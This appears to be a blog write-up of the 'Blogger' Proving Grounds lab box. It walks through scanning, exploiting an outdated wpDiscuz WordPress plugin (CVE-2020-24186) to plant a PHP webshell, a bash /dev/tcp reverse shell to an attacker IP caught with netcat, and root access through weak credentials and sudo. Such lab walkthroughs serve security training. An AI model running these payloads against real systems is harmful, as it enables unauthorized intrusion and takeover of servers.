---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/blogger-1,675/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We are starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.89.217    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-14 13:11 EST
Nmap scan report for 192.168.89.217
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 82.10 seconds
```

## port 80 (web server)

![landing page](/images/blogger_landingpage.png)

### dir busting
```bash
$ gobuster dir -u http://192.168.89.217/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.89.217/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/11/14 13:13:41 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 317] [--> http://192.168.89.217/assets/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.89.217/css/]   
/images               (Status: 301) [Size: 317] [--> http://192.168.89.217/images/]
/index.html           (Status: 200) [Size: 46199]                                  
/index.html           (Status: 200) [Size: 46199]                                  
/js                   (Status: 301) [Size: 313] [--> http://192.168.89.217/js/]    
                                                                                   
===============================================================
2022/11/14 13:15:15 Finished
===============================================================
```

### investigating identified folders
Checking `/assets`
![assets](/images/blogger_assets.png)

Checking `/fonts`
![fonts](/images/blogger_fonts.png)

Checking `/blog`
![blog](/images/blogger_blog.png)

We identified another blog.  
Investigating the links reveals that we should add a domain to our `/etc/hosts` file and add the domain `blogger.thm`
```bash
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.89.217 blogger.thm
```

### scanning the blog
The source code reveals that it is a `wordpress` instance. So lets start with a  `wpscan`.
```bash
$ wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blogger.thm/assets/fonts/blog/ [192.168.89.217]
[+] Started: Mon Nov 14 13:27:08 2022

Interesting Finding(s):
...
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2022-11-08T05:36:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.0.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2022-10-12T19:07:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
...
```

> `wpscan` was able to identify 2 plugins, which additionally are outdated.
{: .prompt-info }

---

# exploitation
## looking for an exploit
```bash
$ searchsploit wpdiscuz  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                                                                                                 | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                                                                                                 | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)                                                                                                                      | php/webapps/49401.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> `WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)` looks promising.
{: .prompt-info }

## exploit
```bash
$ python3 /usr/share/exploitdb/exploits/php/webapps/49967.py                                                                    
[+] Specify an url target
[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
[+] Example help usage: exploit.py -h

$ python3 /usr/share/exploitdb/exploits/php/webapps/49967.py -u http://blogger.thm/assets/fonts/blog -p "/?p=27"
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[60260] | code:[200]
[!] Got wmuSecurity value: c2e2fa9011
[!] Got wmuSecurity value: 27 

[+] Generating random name for Webshell...
[!] Generated webshell name: aulpmqpvdgqvyyc

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/11/aulpmqpvdgqvyyc-1668451299.9271.php&quot; 

> whoami

[x] Failed to execute PHP code...
```

It first seems as if the exploit failed.  
However, if we check the location where the exploit reports it uploaded a shell file and check for a simple code execution, everything seems to work fine.

### request
```http
GET /assets/fonts/blog/wp-content/uploads/2022/11/aulpmqpvdgqvyyc-1668451299.9271.php?cmd=id HTTP/1.1
Host: blogger.thm
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wpdiscuz_hide_bubble_hint=1
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Mon, 14 Nov 2022 18:49:18 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 68
Connection: close
Content-Type: text/html; charset=UTF-8

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Yes! Code execution.
{: .prompt-info }

---
# post exploitation
## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80                                             
listening on [any] 80 ...
```

### trigger reverse shell
```http
GET /assets/fonts/blog/wp-content/uploads/2022/11/aulpmqpvdgqvyyc-1668451299.9271.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.89/80+0>%261' HTTP/1.1
Host: blogger.thm
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wpdiscuz_hide_bubble_hint=1
Connection: close
```

### catch connection from target
```bash
$ nc -lvp 80                                             
listening on [any] 80 ...
connect to [192.168.49.89] from blogger.thm [192.168.89.217] 42352
bash: cannot set terminal process group (1374): Inappropriate ioctl for device
bash: no job control in this shell
<ress/assets/fonts/blog/wp-content/uploads/2022/11$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> And we got a shell!
{: .prompt-info }

## get first flag
```bash
ww-data@ubuntu-xenial:/home$ cd james
cd james
www-data@ubuntu-xenial:/home/james$ ls
ls
local.txt
www-data@ubuntu-xenial:/home/james$ cat local.txt
cat local.txt
a******************************d
```

## privilege escalation
There are 3 different users available on the system.
```bash
www-data@ubuntu-xenial:/home$ ls
ls
james  ubuntu  vagrant
```

Checking for weak passwords reveals that the credentials of user `vagrant` are `vagrant:vagrant`
```bash
www-data@ubuntu-xenial:/home$ su vagrant
su vagrant
Password: vagrant

vagrant@ubuntu-xenial:/home$ whoami
whoami
vagrant
```

Checking if we have super user permissions reveals that we are allowed to execute every binary/command with super user permissions without specifying a password.
```bash
vagrant@ubuntu-xenial:/home$ sudo -l
sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
```

As it is that easy we are using `bash` to escalate to `root`
```bash
vagrant@ubuntu-xenial:/home$ sudo bash
sudo bash
root@ubuntu-xenial:/home# whoami
whoami
root
```

> Root! Root!
{: .prompt-info }

## get second flag
```bash
root@ubuntu-xenial:/home# cd /root
cd /root
root@ubuntu-xenial:/root# ls
ls
proof.txt
root@ubuntu-xenial:/root# cat proof.txt
cat proof.txt
6******************************e
```

Pwned! <@:-)
